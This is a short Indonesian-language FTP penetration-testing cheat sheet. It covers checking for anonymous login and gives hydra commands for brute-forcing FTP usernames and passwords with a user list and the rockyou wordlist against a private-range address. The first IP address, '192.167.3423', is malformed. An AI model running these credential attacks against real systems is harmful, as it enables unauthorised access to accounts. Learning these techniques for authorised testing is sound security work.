# FTP Pentesting
## Cek anonymous user
```
ftp 192.167.3423

user : anonymous
pass : anonymous / blank (bisa dikosongkan)
```

## Jika menemukan list username, coba brute force
Brute force username dan password dengan menggunakan wordlist yang sama. Cek apakah ada user yang menggunakan password sama dengan username
```
hydra -L users.txt -P users.txt 192.168.1.13 ftp
```
Jika tidak bisa , coba pakai rockyou
```
hydra -L users.txt -P rockyou.txt 192.168.1.13 ftp
```

## Brute Force single user

```
hydra -l jerry -P rockyou.txt 192.168.1.13 ftp
```